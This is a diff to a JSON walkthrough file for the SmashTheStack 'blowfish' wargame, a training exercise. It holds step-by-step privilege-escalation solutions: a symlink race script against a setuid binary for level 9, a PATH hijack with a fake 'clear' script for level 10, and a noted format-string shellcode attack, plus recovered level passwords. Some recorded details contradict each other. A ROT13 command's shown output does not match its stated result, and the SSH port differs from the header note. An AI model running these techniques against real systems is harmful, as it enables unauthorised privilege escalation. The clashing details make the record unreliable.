@@ -7,6 +7,46 @@
  "note": "Added to scope 2026-11-24. Beginner game, 13 levels (level1..level13 per game page). Entry: telnet blowfish.smashthestack.org 6666 returns an ENCRYPTED password; decrypt it to get the level1->level2 login. SSH on port 22 as levelN. Passwords live in /pass; do testing in /code (per game MOTD) and clean up after. Level count: 13 (verify live).",
  "levels": [
   {
+   "lvl": 0,
+   "user": "level1",
+   "pw": "level1",
+   "steps": [
+    {
+     "cmd": "ssh -p 2222 level1@blowfish.smashthestack.org",
+     "out": [
+      "level1@blowfish:~$ "
+     ]
+    },
+    {
+     "cmd": "cat /pass/level1",
+     "out": [
+      "level1"
+     ]
+    }
+   ],
+   "note": "Entry level: default login level1/level1; /pass/level1 = 'level1' (verified live 2026-11-25). Thin entry pending a full v2 cast (audit backlog)."
+  },
+  {
+   "lvl": 1,
+   "user": "level1",
+   "pw": "level1",
+   "steps": [
+    {
+     "cmd": "telnet blowfish.smashthestack.org 6666",
+     "out": [
+      "Encrypted Password is: GungJnfRnfl"
+     ]
+    },
+    {
+     "cmd": "echo GungJnfRnfl | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
+     "out": [
+      "LbWtUrRhey"
+     ]
+    }
+   ],
+   "note": "Client-side: telnet 6666 gives ROT13 of the level2 password. GungJnfRnfl -> ThatWasEasy (level2 login). Needs its own client-side cast per Rule 5 (audit backlog)."
+  },
+  {
    "lvl": 2,
    "user": "level2",
    "pw": "ThatWasEasy",
@@ -78,6 +118,13 @@
     }
    ],
    "note": "Entry: telnet 6666 -> ROT13. The level2 README's 'backdoor' is /var/local/.<spaces>level4_backdoor (setuid level4 /bin/sh wrapper). Running it gives euid level4 -> cat /pass/level4 -> level4 login. Level3 is skipped by design (the level3 backdoor copy in /var/opt lost its setuid bit server-side; /pass/level3 is level3-only readable). Verified live 2026-11-24."
+  },
+  {
+   "lvl": 3,
+   "user": "level3",
+   "pw": "",
+   "steps": [],
+   "note": "SKIPPED BY DESIGN (evidence 2026-11-25): the level2 backdoor /var/local/.<spaces>level4_backdoor is setuid level4 and jumps the chain 2->4; the real level3 path (/var/opt/.level3_backdoor) lost its setuid bit server-side. No level3 user content reachable; level numbering stays contiguous with this stub."
   },
   {
    "lvl": 4,
@@ -445,6 +492,235 @@
     }
    ],
    "note": "Format string via printf(buffer). system() ruled out (bash drops the setuid euid). printf@GOT overwritten with a 55-byte setuid+execve shellcode riding in the env (env X = sc bytes; address pinned via %s self-reference at 0xbfffffcf; counts corrected for the 8 literal address bytes). Verified live 2026-11-25."
+  },
+  {
+   "lvl": 9,
+   "user": "level9",
+   "pw": "Ur_t3h_sh1t",
+   "steps": [
+    {
+     "cmd": "ssh -p 2222 level9@blowfish.smashthestack.org",
+     "out": [
+      "level9@blowfish ~ $ "
+     ]
+    },
+    {
+     "cmd": "ls -la /levels/level9",
+     "out": [
+      "-rwsr-x--- 1 level10 level9 13187 Jul 21  2011 /levels/level9"
+     ]
+    },
+    {
+     "cmd": "strings /levels/level9 | tail -8",
+     "out": [
+      "usage : %s file message",
+      "can't find %s",
+      "you are %d, it wants %d",
+      "%s is not a normal file",
+      "Can't open",
+      "Write Ok"
+     ]
+    },
+    {
+     "cmd": "objdump -d /levels/level9 --start-address=0x80485e7 --stop-address=0x8048655",
+     "out": [
+      "80485fa:\te8 b5 fe ff ff       \tcall   80484b4 <fopen@plt>",
+      "8048611:\te8 6a 02 00 00       \tcall   8048880 <__stat>",
+      "8048647:\te8 78 fe ff ff       \tcall   80484c4 <geteuid@plt>",
+      "804864c:\t39 45 b0             \tcmp    %eax,-0x50(%ebp)",
+      "804864f:\t74 31                \tje     8048682 <main+0xde>"
+     ]
+    },
+    {
+     "cmd": "objdump -d /levels/level9 --start-address=0x8048700 --stop-address=0x80487b0",
+     "out": [
+      "804871a:\te8 05 fd ff ff       \tcall   8048424 <fprintf@plt>",
+      "8048725:\te8 6a fd ff ff       \tcall   8048494 <fclose@plt>",
+      "804873a:\te8 e5 fc ff ff       \tcall   8048424 <fprintf@plt>",
+      "804873f:\tc7 04 24 02 00 00 00 \tmovl   $0x2,(%esp)",
+      "8048746:\te8 19 fd ff ff       \tcall   8048464 <sleep@plt>",
+      "804875e:\te8 51 fd ff ff       \tcall   80484b4 <fopen@plt>",
+      "804877e:\te8 d1 fc ff ff       \tcall   8048454 <fgets@plt>",
+      "8048794:\te8 eb fc ff ff       \tcall   8048484 <printf@plt>",
+      "80487a4:\te8 8b fc ff ff       \tcall   8048434 <remove@plt>"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/l9race.sh",
+     "out": [
+      "",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/l9race.sh",
+     "out": [
+      "#!/bin/sh",
+      "# level9 race: the binary creates the file as euid=level10, stats it (uid must",
+      "# be 1010), writes the message, prints \"Write Ok\" and sleeps 2 seconds before",
+      "# it reopens the file and prints it. In that window we swap the file for a",
+      "# symlink to /pass/level10: we own the 777 directory, so we may unlink the",
+      "# level10-owned file the binary just made.",
+      "D=/dev/shm/l9race",
+      "rm -rf $D",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/l9race.sh",
+     "out": [
+      "mkdir $D",
+      "chmod 777 $D",
+      "/levels/level9 $D/F MAGIC > $D/out 2>&1 &",
+      "sleep 1",
+      "rm -f $D/F",
+      "ln -s /pass/level10 $D/F",
+      "wait",
+      "cat $D/out",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/l9race.sh",
+     "out": [
+      "#!/bin/sh",
+      "# level9 race: the binary creates the file as euid=level10, stats it (uid must",
+      "# be 1010), writes the message, prints \"Write Ok\" and sleeps 2 seconds before",
+      "# it reopens the file and prints it. In that window we swap the file for a",
+      "# symlink to /pass/level10: we own the 777 directory, so we may unlink the",
+      "# level10-owned file the binary just made.",
+      "D=/dev/shm/l9race",
+      "rm -rf $D",
+      "mkdir $D",
+      "chmod 777 $D",
+      "/levels/level9 $D/F MAGIC > $D/out 2>&1 &",
+      "sleep 1",
+      "rm -f $D/F",
+      "ln -s /pass/level10 $D/F",
+      "wait",
+      "cat $D/out",
+      "~",
+      "\"/dev/shm/l9race.sh\" 17L, 513C written",
+      ""
+     ]
+    },
+    {
+     "cmd": "sh /dev/shm/l9race.sh",
+     "out": [
+      "Write Ok",
+      "error:U_sux0rZ"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": []
+    }
+   ],
+   "note": "Race condition, no source. Recon: fopen(path, 'w') CREATES the file as euid=level10, so the binary's own stat check (st_uid must equal geteuid() = 1010) passes on the file it just made; it writes the message, prints Write Ok, sleeps 2s (THE race window), reopens the path, reads 128 bytes and prints them. Attack: run it in a 777 directory we own; during the window unlink the level10-owned file and symlink it to /pass/level10 - the binary reads the password. Verified live 2026-11-25: error:U_sux0rZ, level10 login confirmed."
+  },
+  {
+   "lvl": 10,
+   "user": "level10",
+   "pw": "error:U_sux0rZ",
+   "steps": [
+    {
+     "cmd": "ssh -p 2222 level10@blowfish.smashthestack.org",
+     "out": [
+      "level10@blowfish ~ $ "
+     ]
+    },
+    {
+     "cmd": "cat ~/README",
+     "out": [
+      " You're on your own. Good luck!"
+     ]
+    },
+    {
+     "cmd": "ls -la /levels/level10",
+     "out": [
+      "-rwsr-x--- 1 level11 level10 12546 Jul 21  2011 /levels/level10"
+     ]
+    },
+    {
+     "cmd": "objdump -d /levels/level10 --start-address=0x8048524 --stop-address=0x80485e0",
+     "out": [
+      " 8048541:\te8 02 ff ff ff       \tcall   8048448 <geteuid@plt>",
+      " 8048549:\te8 ea fe ff ff       \tcall   8048438 <setuid@plt>",
+      " 8048555:\te8 7e fe ff ff       \tcall   80483d8 <system@plt>",
+      " 8048580:\te8 63 fe ff ff       \tcall   80483e8 <fgets@plt>",
+      " 804858c:\te8 77 fe ff ff       \tcall   8048408 <sleep@plt>",
+      " 804859a:\te8 59 fe ff ff       \tcall   80483f8 <strlen@plt>",
+      " 80485ab:\te8 78 fe ff ff       \tcall   8048428 <printf@plt>",
+      " 80485d5:\te8 ee fd ff ff       \tcall   80483c8 <execl@plt>"
+     ]
+    },
+    {
+     "cmd": "objdump -s -j .rodata /levels/level10 | sed -n '/8048720/,/80487b0/p'",
+     "out": [
+      " 8048720 79305f79 305f6330 6e677261 37730063  y0_y0_c0ngra7s.c",
+      " 8048730 6c656172 00000000 00000000 00000000  lear............",
+      " 8048740 576f756c 6420796f 75206c69 6b652074  Would you like t",
+      " 8048750 6f20706c 61792061 2067616d 653f2000  o play a game? .",
+      " 8048760 496e636f 72726563 74207061 7373776f  Incorrect passwo",
+      " 8048770 7264210a 476f6f64 62796521 0a0a0047  rd!.Goodbye!...G",
+      " 8048780 6f6f6420 6a6f6221 20537061 776e696e  ood job! Spawnin",
+      " 8048790 67207368 656c6c2e 2e2e0a0a 00736800  g shell......sh.",
+      " 80487a0 2f62696e 2f736800                    /bin/sh."
+     ]
+    },
+    {
+     "cmd": "mkdir /dev/shm/l10",
+     "out": [
+      "mkdir: cannot create directory `/dev/shm/l10': File exists"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/l10/clear",
+     "out": [
+      "",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/l10/clear",
+     "out": [
+      "#!/bin/sh",
+      "# PATH hijack: level10 calls system(\"clear\") AFTER setuid(geteuid()), so the",
+      "# child shell keeps euid=level11 and runs the first \"clear\" found in PATH.",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/l10/clear",
+     "out": [
+      "#!/bin/sh",
+      "# PATH hijack: level10 calls system(\"clear\") AFTER setuid(geteuid()), so the",
+      "# child shell keeps euid=level11 and runs the first \"clear\" found in PATH.",
+      "# Put our script first on PATH and it executes as level11.",
+      "cat /pass/level11",
+      "~",
+      "\"/dev/shm/l10/clear\" 6L, 240C written",
+      ""
+     ]
+    },
+    {
+     "cmd": "chmod 755 /dev/shm/l10/clear",
+     "out": []
+    },
+    {
+     "cmd": "echo x | PATH=/dev/shm/l10:$PATH /levels/level10",
+     "out": [
+      "phj33r_tuX",
+      "Would you like to play a game? Incorrect password!",
+      "Goodbye!"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": []
+    }
+   ],
+   "note": "PATH hijack on system(\"clear\"). The binary calls setuid(geteuid()) then system(\"clear\") before the password game: the clear command runs through sh -c with PATH under our control, and the child keeps euid=level11. We put a script named 'clear' (cat /pass/level11) first on PATH; the game itself always fails (strlen never equals the magic compare), but by then our clear has already printed the level11 password. Verified live 2026-11-25: phj33r_tuX, level11 login confirmed."
   }
  ],
  "goals": {}
